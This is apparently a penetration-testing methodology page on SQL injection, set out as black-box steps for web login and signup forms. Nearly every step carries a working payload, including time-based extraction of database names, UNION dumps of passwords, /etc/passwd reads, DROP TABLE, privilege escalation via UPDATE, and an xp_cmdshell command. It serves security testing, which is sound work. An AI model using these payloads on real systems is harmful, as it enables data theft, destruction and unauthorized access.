# SQL Injection

## Check List

## Methodology

### Black Box

#### SQL Injection

{% stepper %}
{% step %}
Identify all user input points in the target application, including form fields (e.g., login, search, or calculators), URL query parameters, cookies, HTTP headers, and POST request bodies
{% endstep %}

{% step %}
Browse every feature of the application, such as calculators, profile settings, or data submission forms, to locate endpoints that likely interact with a database
{% endstep %}

{% step %}
Intercept HTTP requests using a proxy tool (Burp Suite) to capture parameters such as `unitWeight`, `id` or `username`, especially parameters sent as JSON in POST requests and analyze how they are sent to the server
{% endstep %}

{% step %}
Inject a single quote (`unitWeight=10'`) into a parameter and send the request, observing for a 500 Internal Server Error or similar response indicating SQL query disruption
{% endstep %}

{% step %}
Add a second single quote (`unitWeight=10''`) to restore the query syntax, checking if the error disappears, confirming potential SQL injection vulnerability
{% endstep %}

{% step %}
Test for time-based blind SQL injection by injecting a payload like `'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z`, noting a delay (10 seconds) in the response to confirm query execution
{% endstep %}

{% step %}
Experiment with other SQL injection payloads (`' OR 1=1-- or ' AND SLEEP(5)`) to validate the vulnerabilityacross different input points, monitoring for consistent delays or response changes
{% endstep %}

{% step %}
Actively trigger error messages by injecting invalid SQL syntax (`' or --`) in various parameters, analyzing responses for database-related errors or stack traces that reveal SQL usage
{% endstep %}

{% step %}
Test URL parameters by appending SQL payloads (`id=1 AND SLEEP(5)`) to check if the server processes them in a database query, observing response delays or errors
{% endstep %}

{% step %}
Inspect cookies by modifying their values with SQL payloads (`cookie=value' OR 1=1`), checking if the server responds differently or exposes sensitive data
{% endstep %}

{% step %}
Analyze HTTP headers (`User-Agent` or `Referer`) by injecting SQL payloads, monitoring for errors or delays that suggest header data is used in database queries
{% endstep %}

{% step %}
Examine POST request bodies, particularly form submissions, by injecting SQL payloads into fields like username or weight, checking for errors or delayed responses
{% endstep %}

{% step %}
Use a proxy tool’s repeater function to systematically test each parameter with SQL payloads, comparing responses to identify injectable points
{% endstep %}
{% endstepper %}

***

#### Time-Based SQL Injection

{% stepper %}
{% step %}
Identify input fields or parameters in the target application, such as URL query strings (`id=`) or form inputs, that may interact with a database, focusing on features like search, deletion, or data retrieval endpoints
{% endstep %}

{% step %}
Intercept HTTP requests using a proxy tool (Burp Suite) to capture parameters like id or username, analyzing how they are sent to the server for database queries
{% endstep %}

{% step %}
Test for SQL injection by injecting a single quote (`id=187'`) into the parameter and sending the request, observing for server errors (500 Internal Server Error) that indicate unhandled SQL syntax
{% endstep %}

{% step %}
Confirm the absence of verbose error messages in the response, noting generic error pages or no data leakage, suggesting a potential blind SQL injection vulnerability
{% endstep %}

{% step %}
Inject a time-based payload (`id=187 AND SLEEP(5)`) to test for a delay in the server response, confirming time-based SQL injection if the response is delayed by the specified time (5 seconds)
{% endstep %}

{% step %}
Verify the delay by sending a non-sleeping payload `(id=187 AND 1=1`) and comparing response times to ensure the delay is due to the SLEEP command execution
{% endstep %}

{% step %}
Test for boolean-based conditions using payloads like `id=187 AND IF(1=1,SLEEP(5),0)`, checking for a delay when the condition is true and no delay when false (`1=2`)
{% endstep %}

{% step %}
Extract database metadata by injecting payloads like `id=187 AND IF(SUBSTRING(version(),1,1)='5',SLEEP(5),0)` to determine the database version character by character, noting delays for true conditions
{% endstep %}

{% step %}
Determine the database name length using payloads like `id=187 AND IF(LENGTH(database())=10,SLEEP(5),0)`, incrementing the length value until a delay confirms the correct length
{% endstep %}

{% step %}
Extract the database name by iterating through each character position with payloads like `id=187 AND IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0)`, testing all possible characters (a-z, 0-9) and noting delays for correct matches
{% endstep %}

{% step %}
Move to the next character position (`SUBSTRING(database(),2,1)='a'`) after identifying the first character, repeating the process until the full database name is extracted
{% endstep %}

{% step %}
Test for additional metadata, such as table names or column names, using payloads like `id=187 AND IF(EXISTS(SELECT table_name FROM information_schema.tables WHERE table_name='users'),SLEEP(5),0)`to confirm the presence of specific tables
{% endstep %}
{% endstepper %}

***

#### SQL injection Test Case In Sign & Login Page

{% stepper %}
{% step %}
Identify all user input fields on the SignUp and Login pages, such as Full Name, Username, Password, Address, or Profile Description, that may interact with the database
{% endstep %}

{% step %}
Intercept HTTP requests using a proxy tool (Burp Suite) to capture parameters sent to the server, focusing on fields susceptible to SQL injection
{% endstep %}

{% step %}
Test for extreme SQL injection by injecting a destructive payload (`'; DROP TABLE users -- admin'; --`) into the Full Name field during SignUp, observing if the application blocks or sanitizes the input
{% endstep %}

{% step %}
Submit the form and check for error messages or application stability, confirming the application prevents destructive queries like DROP TABLE
{% endstep %}

{% step %}
Test for polyglot SQL injection by injecting a versatile payload (`%' OR '1'='1'; -- "; (SELECT @@version); --`) into the Username field on the Login page, checking for unauthorized access or data leakage
{% endstep %}

{% step %}
Analyze the response for successful login or database version disclosure, ensuring the application rejects polyglot payloads
{% endstep %}

{% step %}
Test for time-based blind SQL injection by injecting a payload (`' OR IF(1=1, SLEEP(5), 0) --`) into the Full Name field during SignUp, noting a delay in response for true conditions
{% endstep %}

{% step %}
Compare responses for true (`1=1`) and false (`1=2`) conditions, confirming time-based injection if delays occur only for true conditions.
{% endstep %}

{% step %}
Test for log tampering by injecting a null byte payload (`admin%00'; EXEC xp_cmdshell('nslookup example.com') --`) into the Username field during Login, checking if the application sanitizes null bytes
{% endstep %}

{% step %}
Monitor logs or external systems for evidence of command execution, ensuring the application blocks log tampering attempts
{% endstep %}

{% step %}
Perform load testing with thousands of concurrent SQL injection requests (' OR 1=1 --) on SignUp and Login pages using a tool like JMeter, monitoring server stability and response times
{% endstep %}

{% step %}
Verify the application remains responsive and does not crash or expose errors under heavy injection attempts
{% endstep %}

{% step %}
Test for UNION-based SQL injection by injecting a payload (`John' UNION SELECT username, password FROM users --`) into the Full Name field during SignUp, checking for unauthorized data retrieval in the response
{% endstep %}

{% step %}
Confirm the application blocks UNION queries and does not display sensitive data like usernames or passwords
{% endstep %}

{% step %}
Test for error-based SQL injection by injecting a payload (`' OR 1=CONVERT(int, (SELECT @@version)) --`) into the Password field during Login, checking for verbose error messages revealing database details
{% endstep %}

{% step %}
Test for boolean-based blind SQL injection by injecting a payload (e.`' OR IF(1=1, 'Success', 'Failure') --`) into the Full Name field during SignUp, checking for differential responses based on true/false conditions
{% endstep %}

{% step %}
Verify the application does not exhibit different behaviors for true and false conditions, indicating proper input handling
{% endstep %}

{% step %}
Test brute-force protection by repeatedly submitting SQL injection payloads (`' OR '1'='1' --`) in the Password field during Login, observing if the application imposes lockouts or delays after a threshold
{% endstep %}

{% step %}
Confirm the application detects and mitigates brute-force attempts, preventing unauthorized access
{% endstep %}

{% step %}
Test for second-order SQL injection by injecting a malicious username (`John'; --`) during SignUp, then attempting Login with the same username to check for query execution
{% endstep %}

{% step %}
Ensure the application sanitizes stored inputs, preventing second-order injection during subsequent Login attempts
{% endstep %}

{% step %}
Test for deeply nested SQL injection by injecting a complex payload ( `' AND 1=1 UNION ALL SELECT 1, 2, 3, ... , 100 --`) into the Full Name field during SignUp, checking if the application handles large queries without errors
{% endstep %}

{% step %}
Verify the application blocks or sanitizes deeply nested queries, maintaining database integrity
{% endstep %}

{% step %}
Test for file inclusion via SQL injection by injecting a payload (`John' UNION ALL SELECT LOAD_FILE('/etc/passwd'), 7, 8, 9, 10 --`) into the Full Name field during SignUp, checking for file content in the response
{% endstep %}

{% step %}
Confirm the application prevents file inclusion attempts, blocking access to sensitive system files
{% endstep %}

{% step %}
Test for comment-based SQL injection by injecting a payload (`John' -- ' OR 1=1 --`) into the Full Name field during SignUp, checking if the comment neutralizes subsequent malicious code
{% endstep %}

{% step %}
Ensure the application properly handles comments, preventing execution of malicious SQL
{% endstep %}

{% step %}
Test input validation and prepared statements by injecting various SQL payloads (`SELECT, UNION, DELETE`) into SignUp and Login fields, monitoring if the application sanitizes or blocks them
{% endstep %}

{% step %}
Verify network traffic or logs to confirm the use of prepared statements, ensuring robust protection against SQL injection
{% endstep %}

{% step %}
Test database error handling by injecting payloads (`' OR 1=1; --`) to provoke errors on SignUp and Login pages, checking if responses expose database details
{% endstep %}

{% step %}
Confirm the application returns generic error messages, avoiding sensitive information leakage
{% endstep %}

{% step %}
Test for SQL keyword blocking by injecting keywords like SELECT, UNION, or DELETE into input fields, checking if the application rejects or neutralizes them
{% endstep %}

{% step %}
Verify the application effectively sanitizes or blocks SQL keywords, preventing injection attempts
{% endstep %}

{% step %}
Test password hash validation by injecting a SQL payload (`' OR '1'='1' --`) into the Password field during Login, ensuring the application validates hashes correctly
{% endstep %}

{% step %}
Confirm the application requires valid credentials and does not allow bypass via SQL injection
{% endstep %}

{% step %}
Test boolean-based blind SQL injection by injecting a payload (`' OR 1=1 --`) into the Full Name field during SignUp, checking for response differences between true and false conditions
{% endstep %}

{% step %}
Test for database version identification by injecting a payload (`' OR 1=1 UNION ALL SELECT @@version --`) into the Full Name field during SignUp, checking for version disclosure in the response
{% endstep %}

{% step %}
Test for data exfiltration by injecting a payload (`' UNION ALL SELECT username, email, password FROM users --`) into the Password field during Login, checking for sensitive data in the response
{% endstep %}

{% step %}
Test for directory traversal via SQL injection by injecting a payload (`' UNION ALL SELECT LOAD_FILE('../../../etc/passwd') --`) into the Full Name field during SignUp, checking for file access
{% endstep %}

{% step %}
Test for polyglot SQL injection by injecting a versatile payload (`%' OR '1'='1'; -- "; (SELECT @@version); --`) into both SignUp and Login fields, checking for unauthorized access or data leakage
{% endstep %}

{% step %}
Test for nested SQL injection by injecting a payload (`John' AND (SELECT COUNT(*) FROM users WHERE username='admin')=1 --`) into the Full Name field during SignUp, checking for query execution
{% endstep %}

{% step %}
Test for time-based blind SQL injection on the Login page by injecting a payload (`' OR IF(1=1, SLEEP(5), 0) --`) into the Password field, noting response delays for true conditions
{% endstep %}

{% step %}
Test for database enumeration by injecting a payload (`' UNION ALL SELECT table_name, column_name, null FROM information_schema.columns --`) into the Full Name field during SignUp, checking for schema disclosure
{% endstep %}

{% step %}
Test for second-order SQL injection on Login by injecting a malicious username (`John'; --`) during SignUp, then logging in to check for query execution
{% endstep %}

{% step %}
Test for authentication bypass via SQL injection by injecting a payload (`' OR '1'='1' -- admin' --`) into the Password field during Login, checking for unauthorized access
{% endstep %}

{% step %}
Test for time-based blind SQL injection with payload variations (`SLEEP(2) vs. SLEEP(5))` in the Full Name field during SignUp, checking for consistent response behavior
{% endstep %}

{% step %}
Test for business logic manipulation by injecting a payload (`' OR 1=1; UPDATE users SET isAdmin = 1 WHERE username = 'John'; --`) into the Full Name field, checking for unauthorized privilege escalation
{% endstep %}

{% step %}
Test for directory listing via SQL injection by injecting a payload (`' UNION ALL SELECT LOAD_FILE('/var/www/html/') --`) into the Full Name field, checking for directory content exposure
{% endstep %}

{% step %}
Test for data manipulation via SQL injection by injecting a payload (e.g., ' OR 1=1; UPDATE users SET password = 'NewPassword' WHERE username = 'John'; --) into the Full Name field, checking for unauthorized data changes
{% endstep %}

{% step %}
Test for blind SQL injection data exfiltration by injecting a payload (`' OR IF(1=1, (SELECT username FROM users WHERE id=1), 0) --`) into the Full Name field, checking for differential responses
{% endstep %}
{% endstepper %}

***

### White Box

## Cheat Sheet
